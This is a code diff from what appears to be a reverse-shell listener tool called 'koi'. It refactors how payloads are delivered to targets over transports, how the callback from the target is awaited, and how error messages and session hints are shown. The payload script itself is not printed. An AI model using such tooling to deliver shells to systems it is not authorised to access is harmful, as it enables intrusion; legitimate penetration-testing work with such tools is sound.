@@ -28,7 +28,7 @@ from koi.utils.cli import (
     SCREENABLE_SENTINEL,
     TOGGLE_SENTINEL,
 )
-from koi.utils.connect import TRANSPORTS, get_transport
+from koi.utils.connect import TRANSPORTS, TransportError, get_transport
 from koi.utils.powerupgrade import upgrade_windows_conptyshell
 from koi.utils.tls import server_context, is_tls_client_hello, try_tls_handshake, encrypt_payload
 from koi.utils.interact import interact
@@ -588,18 +588,20 @@ class Listener:
         if self.host not in ("0.0.0.0", "::", local_ip):
             notify('warning', f"Listener is bound to {bold(self._mask_ip(self.host, 'local'))}, the callback goes elsewhere.")
             notify('status', muted(f"Nothing accepts it: rebind with {bold('--host 0.0.0.0')}, or the payload is lost."))
-        if self.screenable_mode:
-            # The transport inherits the real stdout, so _MaskStream never sees its prompts.
+        if self.screenable_mode and not transport.direct:
             notify('warning', f"{transport.name} writes straight to the terminal, its output is not masked.")
 
         known = {s.id for s in self._snapshot()}
-        cmd = transport.build_command(target, transport.remote_script(local_ip, self.port))
-        env = transport.env(target)
+        script = transport.remote_script(local_ip, self.port)
 
         try:
-            returncode = subprocess.run(cmd, env=env).returncode
-        except FileNotFoundError:
-            notify('error', f"{accent(cmd[0])} is not installed on this machine.")
+            returncode = transport.execute(target, script)
+        except FileNotFoundError as exc:
+            binary = getattr(exc, 'filename', None) or transport.name
+            notify('error', f"{accent(binary)} is not installed on this machine.")
+            return
+        except TransportError as exc:
+            notify('error', str(exc))
             return
         except KeyboardInterrupt:
             print()
@@ -611,7 +613,8 @@ class Listener:
             notify('error', f"{transport.name} failed ({reason}), payload not delivered.")
             return
 
-        landed = self._wait_for_callback(known, None if host is None else target_ip)
+        expect_ip = None if (host is None or transport.direct) else target_ip
+        landed = self._wait_for_callback(known, expect_ip)
         if not landed:
             notify('warning', f"No callback after {int(_CONNECT_WAIT)}s.")
             notify('status', muted(
@@ -932,7 +935,7 @@ class Listener:
         print()
         notify('info', f"Entering session {bold(alert(f'#{sid}'))} {plain(self._mask_ip(ip))}{muted(f':{port}')}")
         if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
-            notify('status', muted('Ctrl+Z to background  ·  line-by-line mode'))
+            notify('status', muted('Ctrl+Z to background  ·  Ctrl+C interrupts remote  ·  line-by-line mode'))
         else:
             notify('status', muted('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
         print()
